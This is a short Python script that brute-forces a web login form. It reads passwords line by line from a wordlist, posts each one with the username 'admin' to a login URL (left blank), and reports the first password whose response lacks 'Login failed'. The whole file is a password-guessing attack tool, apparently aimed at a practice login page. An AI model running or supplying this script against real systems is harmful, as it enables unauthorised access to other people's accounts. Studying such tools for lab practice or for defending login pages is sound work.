from requests import post
from sys import exit as ext


with open('./passwords.txt', 'r') as file:
    for line in file:
        data = {
        "username": "admin", 
        "password": line.strip(), 
        "Login": "submit"
        }
        url = ""
        response = post(url, data=data)

        if "Login failed" not in response.content:
            print("[+] Password discover: " + line.strip())
            ext()
